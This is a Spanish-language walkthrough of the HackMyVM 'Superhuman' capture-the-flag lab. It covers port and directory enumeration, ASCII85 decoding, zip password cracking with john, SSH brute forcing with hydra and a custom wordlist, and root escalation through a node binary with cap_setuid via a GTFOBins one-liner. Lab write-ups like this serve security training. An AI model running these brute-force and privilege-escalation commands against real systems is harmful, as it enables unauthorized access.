# Superhuman HackMyVM

- Ip atacante - 10.0.2.4
- Ip victima - 10.0.2.38

## Enumeracion 

```bash
❯ sudo nmap -Pn -sS -n --min-rate 5000 -p- 10.0.2.38                                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 19:21 EDT
Nmap scan report for 10.0.2.38
Host is up (0.00032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:FE:95:AA (Oracle VirtualBox virtual NIC)
```

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.0.2.38 -x .txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.38
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/04/28 22:12:36 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 274]
/notes-tips.txt       (Status: 200) [Size: 358]
Progress: 2538662 / 2547668 (99.65%)
===============================================================
2023/04/28 22:14:44 Finished
===============================================================
```

Hacemos un curl a la pagina y encontramos con un mensaje que esta cifrado

```
❯ curl --url "http://10.0.2.38/notes-tips.txt"
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```
Con la siguiente pagina encontramos que esta cifrado en ASCII85
https://www.dcode.fr/cipher-identifier

Y con esta pagina encontramo que el mensaje es el siguiente:
https://www.dcode.fr/ascii-85-encoding

```txt
salome doesn't want me, I'm so sad... i'm sure god is dead...
I drank 6 liters of Paulaner.... too drunk lol. I'll write her a poem and she'll desire me. I'll name it salome_and_?? I don't know.

I must not forget to save it and put a good extension because I don't have much storage
```

Basicamente escribio un poema con el nombre de ``salome_and_??`` y lo guardo en una buena extension para ahorrar espacio ya que no dispone de mucho espacio

Entonces si hablamos de extensiones para guardar cosas tenemos el ``zip | rar | 7z``

Encontramos que es .zip

```bash
❯ wget "http://10.0.2.38/salome_and_me.zip"
--2023-04-28 22:27:52--  http://10.0.2.38/salome_and_me.zip
Connecting to 10.0.2.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 452 [application/zip]
Saving to: ‘salome_and_me.zip’

salome_and_me.zip     100%[=====================>]     452  --.-KB/s    in 0s

2023-04-28 22:27:52 (151 MB/s) - ‘salome_and_me.zip’ saved [452/452]
```

Descubrimos el password para revelar la informacion que contiene con john y fuerza bruta

```bash
❯ zip2john salome_and_me.zip > hashZip
Created directory: /home/kali/.john
ver 2.0 efh 5455 efh 7875 salome_and_me.zip/salome_and_me.txt PKZIP Encr: TS_chk, cmplen=252, decmplen=443, crc=91CF0992 ts=393B cs=393b type=8

❯ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashZip
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******           (salome_and_me.zip/salome_and_me.txt)     
1g 0:00:00:00 DONE (2023-04-28 22:30) 25.00g/s 204800p/s 204800c/s 204800C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
❯ cat salome_and_me.txt

----------------------------------------------------

	     GREAT POEM FOR SALOME

----------------------------------------------------

My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!
```

Procedo a hacer un ataque de fuerza bruta por SSH con el usuario fred pero no tiene frutos
Asi que me dispongo a leer mejor el poema y creo que puedo usar las palabras que hay ahi como wordlist

```bash
❯ cat wordlistSuperhuman.txt 
fred
lonely
scared
Salome
salome
schopenhauer
asshole
peephole
darling
lady
baby
```

```bash
❯ hydra -l fred -P wordlistSuperhuman.txt ssh://10.0.2.38 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-28 22:38:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task
[DATA] attacking ssh://10.0.2.38:22/
[22][ssh] host: 10.0.2.38   login: fred   password: ************
```

## SSH

Nos conectamos mediante ssh

Ya dentro de la maquina si ejecutamos ls nos bota
```bash
fred@superhuman:~$ ls
lol
Connection to 10.0.2.38 closed.
```

### User Flag

Buscamos la flag
```
fred@superhuman:~$ find / -name user* 2>/dev/null
/home/fred/user.txt
fred@superhuman:~$ cat /home/fred/user.txt
************er
```

## Escalado de Privilegios

Busco formas de escalar de privilegios
Vemos las capacidades

```bash
fred@superhuman:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/node = cap_setuid+ep
```

Encontramos un codigo en python
https://gtfobins.github.io/gtfobins/node/

```bash
fred@superhuman:~$ cp $(which node) .
fred@superhuman:~$ sudo setcap cap_setuid+ep node
-bash: sudo: command not found
fred@superhuman:~$ /usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
Y con esto somos root 
```bash
# whoami
root
# bash
root@superhuman:~#
```
Con esto buscamos la flag y la obtenemos 
```bash
root@superhuman:~# find / -name root.txt 2>/dev/null
/root/root.txt
root@superhuman:~# cat /root/root.txt
*************an
```